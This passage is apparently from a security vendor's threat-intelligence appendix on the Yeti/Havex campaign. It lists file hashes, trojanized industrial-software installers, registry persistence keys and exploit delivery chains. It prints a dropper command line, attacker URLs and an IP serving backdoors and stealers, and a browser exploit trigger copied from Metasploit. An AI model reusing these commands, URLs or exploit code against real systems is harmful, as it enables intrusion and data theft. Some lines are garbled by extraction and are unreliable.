590a019118c52238c24c39c9ec02ad\ncb58396d40e69d5c831f46aed93231ed0b7d41fee95f8da7c594c9dbd06ee111\ncd019e717779e2d2b1f4c27f75e940b5f98d4ebb48de604a6cf2ab911220ae50\nce99e5f64f2d1e58454f23b4c1de33d71ee0b9fcd52c9eb69569f1c420332235\nd3ee530abe41705a819ee9220aebb3ba01531e16df7cded050ba2cf051940e46\nd588e789f0b5914bd6f127950c5daf6519c78b527b0ed7b323e42b0613f6566f\nd5e3122a263d3f66dcfa7c2fed25c2b8a3be725b2c934fa9d9ef4c5aefbc6cb9\nd71da8a59f3e474c3bcd3f2f00fae0b235c4e01cd9f465180dd0ab19d6af5526\nd755904743d48c31bdff791bfa440e79cfe1c3fc9458eb708cf8bb78f117dd07\nda3c1a7b63a6a7cce0c9ef01cf95fd4a53ba913bab88a085c6b4b8e4ed40d916\ndc612882987fab581155466810f87fd8f0f2da5c61ad8fc618cef903c9650fcd\ndc75404b6fc8cdb73258c2cc7bc758347ffb4237c8d18222f3489dc303daf989\ne029db63346c513be42242e268559174f6b00d818e00d93c14bd443314f65fe5\ne38aa99eff1f9fedd99cf541c3255e99f3276839a883cadb6e916649522729e3\ne42badd8fb20f1bc72b1cec65c42a96ee60a4b52d19e8f5a7248afee03646ace\ne73f8b394e51348ef3b6cea7c5e5ecc2ee06bb395c5ac30f6babb091080c1e74\necb097f3367f0155887dde9f891ff823ff54ddfe5217cdbb391ea5b10c5a08dc\nedb7caa3dce3543d65f29e047ea789a9e429e46bed5c29c4748e656285a08050\nee53e509d0f2a3c888232f2232b603463b421b9c08fe7f44ed4eead0643135d3\nf1d6e8b07ac486469e09c876c3e267db2b2d651299c87557cbf4eafb861cf79c\nf65d767afd198039d044b17b96ebad54390549c6e18ead7e19e342d60b70a2c3\nfb30c3bb1b25b3d4cca975f2e0c45b95f3eb57a765267271a9689dd526658b43\nc43ce82560cea125f65c7701c733c61ae3faa782c8b00efcb44fd7dbd32a5c4b\nebb16c9536e6387e7f6988448a3142d17ab695b2894624f33bd591ceb3e46633\n61f4a9a30c9cce221624da208eac253c8ce95d55da4605b12774619b1a0d1587\n913c21141966750cfe80d1f64f7c819ae59e401b47f0b5031fd2486c10403c91\n87d1d820fd4faea5a48aa3a26d6b5d742b457bff6d291e03dce257d6861766f7\n4c5c02fbd6f35cad2e0a6f15e769bc6d4413219ce059cc11be7589f5d54645ea\n81e5e73452aa8b14f6c6371af2dccab720a32fadfc032b3c8d96f9cdaab9e9df\n387d4ea82c51ecda162a3ffd68a3aca5a21a20a46dc08a0ebe51b03b7984abe9\n0c9b20f4cb0b3206f81c2afbb2ee4d995c28f74f38216f7d35454af624af8876\n45abd87da6a584ab2a66a06b40d3c84650f2a33f5f55c5c2630263bc17ec4139\ne3a7fa8636d040c9c3a8c928137d24daa15fc6982c002c5dd8f1c552f11cbcad\n6b2a438e0233fe8e7ba8774e2e5c59bf0b7c12679d52d6783a0010ecad11978c\n69b555a37e919c3e6c24cfe183952cdb695255f9458b25d00d15e204d96c737b\n101e70a5455212b40406fe70361995a3a346264eabd4029200356565d2bacd6a\nd5687b5c5cec11c851e84a1d40af3ef52607575487a70224f63458c24481076c\n1ba99d553582cc6b6256276a35c2e996e83e11b39665523f0d798beb91392c90\n31488f632f5f7d3ec0ea82eab1f9baba16826967c3a6fa141069ef5453b1eb95\n\n\n-----\n\nf6aab09e1c52925fe599246dfdb4c1d06bea5c380c4c3e9c33661c869d41a23a\n6296d95b49d795fa10ae6e9c4e4272ea4e1444105bddbf45b34ee067b2603b38\n72ff91b3f36ccf07e3daf6709db441d2328cecab366fd5ff81fc70dd9eb45db8\na3a6f0dc5558eb93afa98434020a8642f7b29c41d35fa34809d6801d99d8c4f3\n53d2a3324f276f29c749727c20708a3421a5144046ce14a8e025a8133316e0ac\n1ef47da67f783f8cc8cda7481769647b754874c91e0c666f741611decd878c19\n358da2c5bb5fbd9c9cf791536054bbb387ce37253c31555f5afa544f38de2a3f\n3a88ff66f4eb675f0c3e6c5f947c012945c4e15b77a2cd195de8a8aba23ccb29\n439e5617d57360f76f24daed3fe0b59f20fc9dade3008fd482260ba58b739a23\n2c37e0504b98413e0308e44fd84f98e968f6f62399ea06bc38d3f314ee94b368\nbb3529aa5312abbee0cfbd00f10c3f2786f452a2ca807f0acbd336602a13ac79\n4cf75059f2655ca95b4eba11f1ce952d8e08bb4dbcb12905f6f37cf8145a538d\n170596e88b26f04d349f6014d17a88026ec55eab44888e2a9bb4dd90a79f6878\n59af70f71cdf933f117ab97d6f1c1bab82fd15dbe654ba1b27212d7bc20cec8c\nb8514bff04e8f4e77430202db61ec5c206d3ec0f087a65ee72c9bb94a058b685\n778568b44e13751800bf66c17606dfdfe35bebbb94c8e6e2a2549c7482c33f7a\n224e8349ba128f0ab57bdebef5287f4b84b9dccbc2d8503f53f6333efd5f9265\nfd689fcdcef0f1198b9c778b4d93adfbf6e80118733c94e61a450aeb701750b4\naef82593822a934b77b81ebc461c496c4610474727539b0b6e1499ca836f0dee\nfd689fcdcef0f1198b9c778b4d93adfbf6e80118733c94e61a450aeb701750b4\nd89a80a3fbb0a4a40157c6752bd978bc113b0c413e3f73eb922d4e424edeb8a7\n\nExploits:\n\n1b12b5bfa6488f05680cc5aacdeda420b643713c88964b824913117cfbcd37e5\n6b72d7aaccb2bf2f2cc08f8fab1c1a65beccd62d2f404d6c04806f3dc3c7ed3b\n6cd18347407c78195e25adcc532eec0c2ef4e0940f8572909978404b7b9a4264\nd1da07b851ae861da09a4ec4b4ab0b8b1bf44470f4266eaccacacb62e24f825b\n3d4c9cad0830c653a06bc6a15739e5c938b83b7ee910895190acfc5bf879945a\nb7b70238c7463ea53e3f9d242e3a4dac94eae0e03545df5245a0fa4a62904e41\n\nModules:\n\n004c99be0c355e1265b783aae557c198bcc92ee84ed49df70db927a726c842f3\n6aca45bb78452cd78386b8fa78dbdf2dda7fba6cc06482251e2a6820849c9e82\n7933809aecb1a9d2110a6fd8a18009f2d9c58b3c7dbda770251096d4fcc18849\n0859cb511a12f285063ffa8cb2a5f9b0b3c6364f8192589a7247533fda7a878e\nf4bfca326d32ce9be509325947c7eaa4fb90a5f81b5abd7c1c76aabb1b48be22\n2120c3a30870921ab5e03146a1a1a865dd24a2b5e6f0138bf9f2ebf02d490850\n9a2a8cb8a0f4c29a7c2c63ee58e55aada0a3895382abe7470de4822a4d868ee6\n\n\n-----\n\nClientX:\n\n66ab3a26ffe5d9fb72083dc3153d0ddfbfb621cc34a299dd987049b479244480\n\nKaragany:\n\n05fb04474a3785995508101eca7affd8c89c658f7f9555de6d6d4db40583ac53\n07bd08b07de611b2940e886f453872aa8d9b01f9d3c61d872d6cfe8cde3b50d4\n1b3cf050d626706d32c1c2c1cbd4975d519cfbdb9bca0f2e66b7e1120030b439\nfcf7bfe68ff302869475b73e4c605a099ed2e1074e79c7b3acb2a451cd2ea915\na553384eeadf4ad39e6c89bf16a146c01ebf627d042485844d75cd67b421afb8\nb1a3e67200a3837ecf45481885c2eca88f89509443a0bcec01b12aa737007a9b\na97b5be3d24966ffbeaca15250477b434485f0b3a4c106c443855bbe60426df5\n1cbe3c94e97d99e4e6a09cc6a790e1d26afc3d7cb89b90665a0de22680c6f8d7\n\n\n-----\n\n# X. Appendix 10: Delivery methods – detailed analysis\n\n## 10.1. Hijacked installers of legitimate software\n\n**SwissRanger camera driver (sysmain dropper)**\n\nA hijacked installer of libMesaSR used by the “SwissRanger” camera driver, produced by Acroname:\nhttp://www.acroname.com/\n\nFiles details:\n\nSHA-256: 398a69b8be2ea2b4a6ed23a55459e0469f657e6c7703871f63da63fb04cefe90\nSize: 1311927\nCompiled: Sat, 28 May 2011 16:04:38 UTC\nDetected as: Trojan.Win32.Inject.hhwa\nDescription: trojanized installer\n\nPath: `%TEMP%\\tmp687.dll and %APPDATA%\\sydmain.dll`\nSHA-256: a8e6abaa0ddc34b9db6bda17b502be7f802fb880941ce2bd0473fd9569113599\nSize: 133152\nCompiled: Wed, 12 Jun 2013 04:31:14 UTC\nDetected as: Trojan.Win32.Inject.hhwa\nDescription: Sysmain backdoor\n\nPath: `%TEMP%\\setup.exe`\nSHA-256: 7fa188fb3bfecbd0fbbb05cfa4a3078ac44f68c63b784b20046e470613e35f96\nSize: 1181500\nCompiled: Sat, 05 Dec 2009 22:50:52 UTC\nDescription: original installer, version 1.0.14.706\n\nRegistry modification:\n\n[HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n```\nl d C \\WINDOWS\\ t 32\\ dll32 “ \\d t d tti \\l \\ li ti\n\n```\n\n-----\n\n```\ndata\\sydmain.dll”,AGTwLoad\n\n```\neWon software (Havex dropper)\n\nA hijacked installer of eCatcher - a piece of legitimate software developed by a Belgian producer of\nSCADA and industrial network equipment:\nhttp://www.ewon.be/en/home.html\n\nFiles details:\n\nSHA-256: 70103c1078d6eb28b665a89ad0b3d11c1cbca61a05a18f87f6a16c79b501dfa9\nSize: 43971440\nCompiled: Sat, 31 Mar 2007 15:09:46 UTC\nDetected as: (not detected yet)\nDescription: trojanized installer\nUrl: hxxp://www.ewon.biz/software/eCatcher/eCatcherSetup.exe\n\nPath: `%TEMP%\\TmProvider.dll and %SYSTEM%\\TMPProvider.dll`\nSHA-256: 401215e6ae0b80cb845c7e2910dddf08af84c249034d76e0cf1aa31f0cf2ea67\nSize: 327168\nCompiled: Mon, 30 Dec 2013 12:53:48 UTC\nDescription: Havex version 038\n\nPath: `%TEMP%\\eCatcherSetup.exe`\nSHA-256: c7caa7fa2a23508b0a024a6a4b2dcaad34ab11ea42dffc3a452901c007cdfc34\nSize: 43785864\nCompiled: Fri, 19 Jun 1992 22:22:17 UTC\nDescription: original installer, version 4.0.0.13073\n\nPath: `%TEMP%\\qln.dbx`\nSize: 2\nDescription: text file with Havex version number\n\nRegistry modification:\n\n[HKCU/HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n```\nTmProvider = rundll32 “%SYSTEM%\\TMPprovider038.dll”, RunDllEntry\n\n```\n[HKLM\\Software\\Microsoft\\Internet Explorer\\InternetRegistry]\n\n\n-----\n\n```\nfertger = 269684507736283195770098FD80-25\n\n```\n**mbCheck software (Havex dropper)**\n\nA hijacked installer of legitimate software for the remote maintenance of PLC systems mbCHECK produced by MB Connect Line GmbH:\nhttp://www.mbconnectline.com/index.php/en/\n\nFiles details:\n\nSHA-256: 0b74282d9c03affb25bbecf28d5155c582e246f0ce21be27b75504f1779707f5\nSize: 1141478\nCompiled: Sun, 14 Jul 2013 20:09:51 UTC)\nDetected as: Trojan-Dropper.Win32.Injector.kcnn\nDescription: Trojanized installer\n\nPath: `%TEMP%\\mbCHECK.dll and %SYSTEM%\\svcprocess043.dll`\nSHA-256: d5687b5c5cec11c851e84a1d40af3ef52607575487a70224f63458c24481076c\nSize: 437248\nCompiled: Fri, 11 Apr 2014 05:37:36 UTC\nDescription: Havex version 043\nResource: `12.MTMxMjMxMg==.5.havex.14400000.12.Explorer.EXE.0.2.66.sinfulce`\n```\n       lebs.freesexycomics.com/wp05/wp-admin/includes/tmp/tmp.php.90.ra\n       pidecharge.gigfa.com/blogs/wp-content/plugins/buddypress/bp-sett\n       ings/bp-settings-src.php.354.AATXn+MiwLu+xCoMG7SqY1uQxAk1qLdyoED\n       9LxIVQr2Z/gsrHIsgTvK9AusdFo+9..fzAxf1zXj42880+kUmktmVb5HSYi8T27Q\n       54eQ4ZLUFKPKZstgHcwPVHGdwpmmRmk..09fL3KGd9SqR60Mv7QtJ4VwGDqrzOja\n       +Ml4SI7e60C4qDQAAAAAAAAAAAAAAAAAA..AAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n       AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..AAAAAAAAAAAAAAAAAAAAAAAAAAA\n       AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..AAAAAAAAAAAAAAAAAAAAAQAB.\n       29.c8a7af419640516616c342b13efab.29.45474bca5c3a10c8e94e56543c2b\n       d.600000.2000.323000.10.svcprocess.\n\n```\nPath: `%TEMP%\\mbCHECK.exe`\nSHA-256: 34254c2decc973dbd8f28b47690f233f5c5d3e1735ee20a6b8dd1dbe80d16d81\nSize: 1647104\nCompiled: Thu, 25 Jul 2013 13:30:28 UTC\nDescription: original software, version 1.1.1.0\n\n\n-----\n\nPath: `%TEMP%\\qln.dbx`\nSize: 2\nDescription: text file with Havex version number\nRegistry modification:\n\n[HKCU|HKLM]\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n```\nsvcprocess = rundll32 “%SYSTEM%\\svcprocess043.dll”, RunDllEntry\n\n```\n[HKLM\\Software\\Microsoft\\Internet Explorer\\InternetRegistry]\n```\nfertger = 229182459113651166490098FD80-c8a7af419640516616c342b13efab\n\n```\nSecond stage tool delivery:\n\nkinoporno.org was a confirmed Yeti site. It served Havex variant (d532eb6835126e53e7ae491ae29f\nd8b3) at\nkinoporno.org/Provider.dll.\nIt also served up the well-known lateral movement utility 64bit Windows Credential Editor tool at\nkinoporno.org/wce64.exe\n\nAnother example above included a credential and document stealing component, downloaded as a\npart of the attack chain from nahoonservices.com:\n91.203.6.71/check2/muees27jxt/fl.exe\n\n\n-----\n\n## 10.2. Exploitation\n\n**CVE-2011-0611 - PDF exploit**\n\nThe exploit is delivered as an XDP file (XML Data Package) which is actually a PDF file packaged\nwithin an XML container. This is a known PDF obfuscation method which serves as an additional\nanti-detection layer.\n\nThe XDP file contains an SWF exploit and two files (encrypted with XOR 0x04) stored in the invalid\nsection of the PDF. One of the files is Havex DLL (version 038), the other is a small JAR file, which is\nused to copy and run the DLL by executing the following command:\n```\ncmd /c copy <fname_passed_as_param> %TEMP%\\\\explore.dll /y & rundll32.exe %TEMP%\\\\\nexplore.dll,RunDllEntry\n\n```\nThe SWF executes the action script, which contains a shellcode (encrypted with XOR 0x96) and another\nSWF file (encrypted with XOR 0x7D) which uses the CVE-2011-0611 vulnerability to run the shellcode.\n\nThe shellcode then looks for the signature S18t in the memory (which signs the start of encrypted\nDLL), decrypts and loads it.\n\nFiles summary:\n\nSHA-256: c521adc9620efd44c6fe89ff2385e0101b0e45bcd7ffcdd88e26fbab4bec2ef1\n\nFile type: XDP\nSize: 447723\nDetected as: Exploit.SWF.Pdfka.b\nDescription: initial dropper\n\nSHA-256: 6b72d7aaccb2bf2f2cc08f8fab1c1a65beccd62d2f404d6c04806f3dc3c7ed3b\nFile name: A9R1A89.pdf\nSize: 335498\nDetected as: Exploit.SWF.Pdfka.a\nDescription: embedded PDF document\n\nSHA-256: dd6ea7b1f6d796fce4c562402549ef27f510747ddc9d71c54f47c9a75a7cf870\nFile name: Tatsumaki.swf\nSize: 3264\nDetected as: Exploit.SWF.Pdfka.a\nDescription: malformed SWF\n\n\n-----\n\nSHA-256: e94b97716d354a21dcff365e91d2f445fe2cac6a01a38f6dd1c921c57eeafef4\nFile type: SWF\nSize: 1484\nDetected as: Exploit.SWF.CVE-2011-0611.ae\nDescription: malformed SWF\n\nSHA-256: 3b6611878a4ebbafae0841e8057171d27793c5c883fdf8fb631c147f18dd90fe\nFile name: htua.as\nSize: 8127\nDetected as: Exploit.SWF.Pdfka.c\nDescription: malicious Action Script\n\nSHA-256: 9879f436afab7121e74c43cc9e7a9561711254fb1fc2400f68791932d2414c44\nFile name: javaapplication1.jar\nDescription: java file used to load the DLL\n\nSHA-256: f6aab09e1c52925fe599246dfdb4c1d06bea5c380c4c3e9c33661c869d41a23a\nPath: %TEMP%\\explore.dll\nSize: 327168\nCompiled: Mon, 30 Dec 2013 12:53:48 UTC\nDetected as: Trojan.Win32.Bublik.burw\nDescription: dropped DLL: Havex version 038\n\n**CVE-2012-1723 / CVE-2012-4681 - JAVA exploit**\n\nIn relation to the Yeti infections, we have discovered a malicious JAVA applet - named googlea.\njar - which was part of the malicious HTML file. It uses either CVE-2012-1723 or CVE-2012-4681,\ndepending on which Java version is running on the victim’s machine. It downloads payloads to\n%JAVATMP%\\roperXdun.exe (where X is the sequential number starting from 0 for the payload\nfrom the first URL from the list) and executes them.\n\nThe URL list is stored in the “uid” parameter in HTML file, so there is no way of checking what\nthe payload was and where it came from without having the original HTML that embedded the\nmalicious applet. The URLs in the parameter are encrypted in the form of a string composed from\nnumbers from 0 to 71 separated by colons. Each number represents a different ASCII character.\n\nDetections\n\ngooglea.class -- Exploit.Java.CVE-2012-1723.ou\ngoogleb class Exploit Java CVE 2012 1723 eh\n\n\n-----\n\ngooglec.class -- Exploit.Java.CVE-2012-1723.ov\ngoogled.class -- Exploit.Java.CVE-2012-4681.at\ngooglee.class -- Exploit.Java.CVE-2012-4681.au\ngooglef.class -- Exploit.Java.CVE-2012-1723.ow\nhidden.class -- Exploit.Java.CVE-2012-4681.as\nV.class -- Exploit.Java.CVE-2012-4681.ar\n\n**CVE-2010-2883 - Adobe Reader exploit**\n\nnahoonservices.com/wp-content/plugins/rss-poster/jungle.pdf → 3c38cb140c83d35ac312b7906b9\n34fe3\n%temp%\\TmpProvider0.dll\n783A5870FA3ECDEA0C49B20F5C024EFC\n\nAlmost predictably, this early Yeti pdf exploit is yet another metasploit rip. The ROP used in this Yeti\nexploit matches the msf code instruction for instruction. The pdf stores the Havex downloader in its\ncontent, which it writes to %temp% and executes after obtaining control flow from Adobe Reader.\n\nThe significant stages of this exploit start by setting up parameters for the vulnerable strcat call in\nthe CoolType SING table parsing library here, in order to overwrite the stack with an appropriate\nROP blob. The code is paused here at the vulnerable strcat call:\n\n\n-----\n\nAfter the strcat call values smash the stack, an exact copy of the metasploit ROP code delivered by\nthe Yeti exploit pivots from the (msf-selected) icucnv36.dll library into the microsoft c runtime to\nmake a memcpy call here:\n\nThe original 0-day exploiting this Adobe Reader vulnerability targeted icucnv34.dll. Function call\nchains for both the Yeti ROP and the msf ROP are as follows:\n\nCreateFileA\nCreateFileMappingA\nMapViewOfFile\nsave and load the saved mapping ptr\nmemcpy\nret back into shellcode for Havex file write to %temp% and execute\n\nThis work is clearly a rip from metasploit.\n\n**CVE-2012-5076 - Java exploit**\n\nwww.nahoonservices.com/wp-content/plugins/rss-poster/dgoat.jar → www.nahoonservices.com/wpcontent/plugins/rss-poster/jungle.php (TmpProvider0.dll, 2e39e7bd5d566893fe3df0c7e145d83a)\n\ndgoat jar\n\n\n-----\n\n│\n└───dgoat\n│  EvilPolicy.class, 761 bytes\n│  Mosdef.class, 2176 bytes\n│  SiteError$1.class, 1976 bytes\n│  SiteError.class, 4347 bytes\n│\n└───META-INF\nMANIFEST.MF, “Manifest-Version: 1.0”\n\nAnother exploit ripping metasploit code. This exploit was first seen on a large scale when exploit\ncode targeting cve-2012-5076 was included in the “Cool Exploit” pack. The flaw lies in the\nconfiguration of the JRE itself and enables untrusted applets to access dangerous packages. In other\nwords, “com.sun.org.glassfish.,\\” was left out of the checkPackageAccess list in the java.security file.\n\nFrom the unrestricted com.sun.org.glassfish.* package, the untrusted applets can create a class with\nelevated privilege. In this case, one of the exposed “dangerous” packages happens to be com.sun.\norg.glassfish.gmbal, which you can see imported by “SiteError.class”:\n\nAlso in that class file is the trigger itself, where a malicious class is loaded on the fly by the\nunrestricted “GenericConstructor” code that should not have been available to an untrusted applet.\n\nThe new instance of localClass created from smd_bytes is nothing more than a call to set the\nSecurityManager value to null, effectively turning off the JRE sandbox security access features. The\nexploit maintains a class in the byte array:\n\n\n-----\n\nAnd when decoded, the contents of this smd_bytes array are in fact “SecurityManagerDisabler.\nclass”:\n\nAfter SecurityManagerDisabler.class disables the JRE SecurityManager, SiteError.class code loads\nthe Mosdef.class, which downloads and runs another Havex backdoor. It downloads\nwww.nahoonservices.com/wp-content/plugins/rss-poster/jungle.php to %temp%, renames it to\nTMPprovider0.dll and executes the Havex code:\n\n\n-----\n\n**CVE-2013-1488 - Java exploit**\n\nwww.nahoonservices.com/wp-content/plugins/rss-poster/start.jar → www.nahoonservices.com/\nwp-content/plugins/rss-poster/juch.php\n6f50b55b9f08522e35f871a9654c5a84, start.jar, Exploit.Java.CVE-2011-3544.sf\nDelivers “coresyns.exe”, a Karagany backdoor\nstart.jar\n```\n ¦  FakeDriver.class, 1771 bytes\n ¦  FakeDriver2.class, 1573 bytes\n ¦  LyvAGalW.class, 2459 bytes\n ¦\n +---META-INF\n  ¦  MANIFEST.MF - “Manifest-Version: 1.0, Created-By: 1.7.0_11 (Oracle Corporation)”\n  ¦\n  +---services\n\n```\njava.lang.Object - “FakeDriver,FakeDriver2”\njava.sql.Driver - “com.sun.script.javascript.RhinoScriptEngine”\n\n**CVE-2013-0422 - Java exploit**\n\nwww.nahoonservices.com/wp-content/plugins/rss-poster/direct.jar →\nwww.nahoonservices.com/wp-content/plugins/rss-poster/noah.php, syscmmnet.exe\n8907564aba9c9ae3225e304a847d8393, direct.jar, HEUR:Exploit.Java.CVE-2013-0431.gen\nfd4927baf0c49ecc3d9285404499a664b09e88140862b6f0ffadd5892de8618e\ndirect.jar\n```\n ¦  Joker.class, 809 bytes\n ¦  King.class, 4234 bytes\n ¦  Servant.class, 1231 bytes\n ¦\n +---META-INF\n\n```\nMANIFEST.MF - “Manifest-Version: 1.0, Created-By: 1.7.0_11 (Oracle Corporation)”\n\n**CVE-2013-2465 - Java exploit**\n\nserviciosglobal.com/classes/kool.jar →\nserviciosglobal.com/classes/crunur2i.php?dwl=fne\n→ %temp%\\ntsvcreg.exe\n\n6b89e569cfe25e6bb59ca51198f6e793, kool.jar, HEUR:Exploit.Java.Generic\n5ecd5f9e2c38bdbc88ca29f363967812016b770d027842a9670d4ceb5b61232f\n\n\n-----\n\nkool.jar\n```\n¦  fcswzHCx.class, 330 bytes\n¦  gQHcpqRh.class, 486 bytes\n¦  laovYlnv.class, 2804 bytes\n¦  nTAYnMtP$MyBufferedImage.class, 495 bytes\n¦  nTAYnMtP.class, 4774 bytes\n¦  qmNkVdFD.class, 331 bytes\n¦  sMYrLAwc.class, 456 bytes\n¦\n+---META-INF\n\n```\nMANIFEST.MF - “Manifest-Version: 1.0, Created-By: 1.7.0_11 (Oracle Corporation)”\n\nThis exploit is ripped almost directly from the metasploit framework - it’s simply modified with an\nadditional string obfuscation handling method. The obfuscation code in this java exploit is fairly\nweak but effective in modifying the metasploit code just enough to cover up similarities. The exploit\ncode was only slightly modified here to demonstrate the crypto routine and hardcoded string values\nfor the payload url and filepath:\n\nOutput here:\n\n**Another CVE-2013-2465(2014.03)**\n\nmahsms.ir/wp-includes/pomo/srgh.php?a=r2 →\nhttp://mahsms.ir/wp-includes/pomo/srgh.php?a=dwe\n(%temp%\\ntregsrv exe)\n\n\n-----\n\n7193a06fd7ffe78b67a5fc3c3b599116,file.jar,\n```\n¦  dAFyTngH.class, 449 bytes\n¦  FVlMQjZg.class, 330 bytes\n¦  gYEgZwVz.class, 331 bytes\n¦  jqoZhkHr$MyBufferedImage.class, 495 bytes\n¦  jqoZhkHr.class, 4785 bytes\n¦  NNpGXbMk.class, 486 bytes\n¦  yqHWgAJa.class, 2783 bytes\n+---META-INF\n\n```\nMANIFEST.MF, “Manifest-Version: 1.0\\d\\nCreated-By: 1.7.0_11 (Oracle Corporation)”\n\n**CVE-2013-1347 - Internet Explorer exploit**\n\nkenzhebek.com_tiki/files/templates/listpages/negc.html →\nkenzhebek.com/tiki/files/templates/listpages/hoem.php\n\nwww.nahoonservices.com/wp-content/plugins/rss-poster/negc.html →\n\nee6409deb87cabb1d573b9e1367bd0df, negc.html, Exploit.JS.CVE-2013-1347.a\nec7ce1f3eac658ebd31d26d8d719b14903502cdea4938e6935a74d9355fe5282\n\n2e27a5d1a4f4cf5729d23303a56daa70, negc.html, Exploit.JS.CVE-2013-1347.b\n\n03637d861d1b58863a212d4993fe4d2f, tmpprovider0.dll, Trojan-Dropper.Win32.Daws.bqsi\ncb58396d40e69d5c831f46aed93231ed0b7d41fee95f8da7c594c9dbd06ee111\n\nThe exploit itself is finicky. It is another rip of the corresponding metasploit code, with minor modifications.\nSee “Obvious Metasploit Rips” below. The shellcode delivered with the exploit is nothing out of the ordinary,\nusing expected thread environment variables to identify module locations in the memory...\n\nThe shellcode gets more interesting due to the manner in which the download url string was built\n\n\n-----\n\nThe encoding algo was a simple additive 0x1010101 against every four bytes of the reversed string\n“kenzhebek.com/tiki/files/templates/listpages/hoem.php”, which was downloaded as a Havex\nbackdoor. The decoder looks like this...\n\n**CVE-2012-1889 - Internet Explorer components exploit**\n\nroxsuite.com/includes/phpmailer/irl.html →\n8b15ef4815c771a94b4adcaee8c67100\n718c6211cb78e5fea0e02be4960c23f6c1cdb1eedeb7a711b595b422c84076a3\n\nroxsuite.com/includes/phpmailer/page.jpg →\nc:\\DOCUME~1\\p\\LOCALS~1\\Temp\\sysplug.exe\n11c3bb242264fe5146854ca27ebd50b0, sysplug.exe, Worm.Win32.WBNA.pdj\nSigned with Intel Certificate, Root CA Intel (likely spoofed)\n\n→ %temp%\\crtscp.exe\n59f7a5d39c47bd62fedf24f5f2ea6e01, crtscp.exe, Worm.Win32.WBNA.pdj\n24c9d984bdaf2152bde121393efbaa894d3a361090f6b97623a90567c27ee2ca\n\n\n-----\n\n→ %temp%\\spoolsv.dll\n5441c2cfbdf1feafc3dafd69c34f5833, spoolsv.dll, Trojan.Win32.Agent.icrq\n103ee051b40466a13f03021903ea49194c1d1e31064173e21798502bcf7e276a\n\nIdentifying the clsid used in this script is a giveaway on the targeted MS XML Core Services\nsoftware:\nOf course, most of this code appears to be ripped from the corresponding metasploit exploit code.\nInterestingly, the metasploit code was derived from 0day Itw at the time in June 2013. But the\n\nattackers didn’t use it until after the vulnerability was patched. The Yeti attackers simply did not\nneed a 0-day arsenal.\n\nThe attackers must have known or expected that they were targeting Internet Explorer 7 on the\nvictims’ systems. The later, updated versions of the corresponding metasploit code maintain ROP\nto evade problems with attacking IE 8+ ASLR/DEP protections, but the Yeti code does not. This\nabsence is somewhat odd, because KSN events indicate the code was active in August 2013, and the\nmetasploit dev added ROP to their code in June 2013.\n\nThe shellcode delivered from this exploit also includes an unusual url and filename string build routine:\n\n\n-----\n\nThe decoded strings here:\n\n\n-----\n\n## 10.3. Obvious Metasploit Rips\n\nThe Yeti exploits are ripped line-for-line from the metasploit framework.\n\nFor example, class files served from www.nahoonservices.com/wp-content/plugins/rss-poster/start.\njar include code pulled from the msf. From the Yeti LyvAGalW.class file:\n```\nSystem.out.println(“Here we go...”);\nString s = “jdbc:msf:sql://127.0.0.1:8080/sample”;\nString s2 = “userid”;\nString s3 = “password”;\njava.sql.Connection connection = DriverManager.getConnection(s, s2, s3);\n\n```\nAnd for comparison, here is the java exploit code from metasploit framework: github.com/rapid7/\nmetasploit-framework/blob/master/external/source/exploits/cve-2013-1488/Exploit.java:\n```\nSystem.out.println(“Here we go...”);\nString url = “jdbc:msf:sql://127.0.0.1:8080/sample”;\nString userid = “userid”;\nString password = “password”;\nConnection con = DriverManager.getConnection(url, userid, password);\n\n```\nYeti’s delivery of CVE-2013-1347 from nahoonservices.com/wp-content/plugins/rss-poster/negc.\n\nhtml displays much the same level of technical originality. From negc.html\n```\nf0 = document.createElement(‘span’);\ndocument.body.appendChild(f0);\nf1 = document.createElement(‘span’);\ndocument.body.appendChild(f1);\nf2 = document.createElement(‘span’);\ndocument.body.appendChild(f2);\ndocument.body.contentEditable=”true”;\nf2.appendChild(document.createElement(‘datalist’));\nf1.appendChild(document.createElement(‘span’));\nf1.appendChild(document.createElement(‘table’));\ntry{\n    f0.offsetParent=null;\n}catch(e) {\n}f2 innerHTML=””;\n\n```\n\n-----\n\n```\nf0.appendChild(document.createElement(‘hr’));\nf1.innerHTML=””;\nCollectGarbage();\ntry {\n    a = document.getElementById(‘myanim’);\n    a.values = animvalues;\n}\ncatch(e) {}\n\n```\nThe matching CVE-2013-1347 code pulled from msf\n\nhttps://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/\nbrowser/ie_cgenericelement_uaf.rb (minor modifications made to its shellcode build algorithm.\nActually, the Yeti version is dumbed down, when compared to the metasploit framework version ):\n```\nf0 = document.createElement(‘span’);\ndocument.body.appendChild(f0);\nf1 = document.createElement(‘span’);\ndocument.body.appendChild(f1);\nf2 = document.createElement(‘span’);\ndocument.body.appendChild(f2);\ndocument.body.contentEditable=”true”;\nf2.appendChild(document.createElement(‘datalist’));\nf1.appendChild(document.createElement(‘span’));\nf1.appendChild(document.createElement(‘table’));\ntry{\n    f0.offsetParent=null;\n}catch(e) {\n}f2.innerHTML=””;\nf0.appendChild(document.createElement(‘hr’));\nf1.innerHTML=””;\nCollectGarbage();\ntry {\n    a = document.getElementById(‘myanim’);\n    a.values = animvalues;\n}\n\n```\n\n-----\n\n## 10.4. Changing Lights Out exploit sites’ download flow\n\nIn earlier cases (July 2013), successful Java exploitation served from nahoonservices.com would\ncascade into more Yeti components planted on victim systems. The java exploit in turn downloaded\nKaragany backdoors, which in turn downloaded stealers from 91.203.6.71:\n\nUser visits utilico.co.uk → redirected to → nahoonservices.com → Java Exploits →\nwww.nahoonservices.com/wp-content/plugins/rss-poster/start.jar\nwww.nahoonservices.com/wp-content/plugins/rss-poster/juch.php\na615d71af0c856c89bb8ebb5c6e7644d\nfcf7bfe68ff302869475b73e4c605a099ed2e1074e79c7b3acb2a451cd2ea915\njuch.php saved as “searchindexer.exe”, or “coresyns.exe” and run, then downloads and runs...\n→ 91.203.6.71/check2/muees27jxt/fl.exe\n4bfdda1a5f21d56afdc2060b9ce5a170\n07bd08b07de611b2940e886f453872aa8d9b01f9d3c61d872d6cfe8cde3b50d4\n→ 91.203.6.71/check2/muees27jxt/scs.exe\nda94235635f61a06a35882d30c7b62b3\n05fb04474a3785995508101eca7affd8c89c658f7f9555de6d6d4db40583ac53\n\nIn a later 